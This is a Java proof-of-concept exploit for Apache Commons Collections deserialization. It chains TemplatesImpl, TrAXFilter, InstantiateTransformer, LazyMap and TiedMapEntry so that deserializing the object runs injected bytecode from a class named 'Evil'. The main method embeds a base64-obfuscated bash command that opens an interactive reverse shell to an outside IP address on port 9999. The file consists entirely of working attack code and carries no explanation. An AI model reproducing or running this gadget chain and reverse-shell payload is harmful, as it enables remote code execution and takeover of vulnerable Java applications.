package CC5EXP;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void setValue(String name, Object target, Object value) {
        try {
            Field field = target.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(target, value);
        } catch (Exception ignore) {
        }
    }

    public  static  void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public  static  Object  unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody(" try {\n" +
                    " Runtime.getRuntime().exec(\"" + cmd +
                    "\");\n" +
                    " } catch (Exception ignored) {\n" +
                    " }");
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name", "aaa");

        byte[] code = getTemplatesImpl("\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84MS42OC4xMjAuMTQvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\"}");
        byte[][] bytecodes = {code};
        setValue(templates, "_bytecodes", bytecodes);
        setValue(templates,"_tfactory", new TransformerFactoryImpl());



        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})

        };

        ChainedTransformer chainedTransformer = new  ChainedTransformer(transformers);

        HashMap<Object,Object> map = new  HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");

        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");
        lazyMap.remove("key");

        Class c = LazyMap.class;
        Field field =  c.getDeclaredField("factory");
        field.setAccessible(true);
        field.set(lazyMap, chainedTransformer);

        serialize(map2);
        unserialize("ser.bin");
        //templates.newTransformer();

    }
}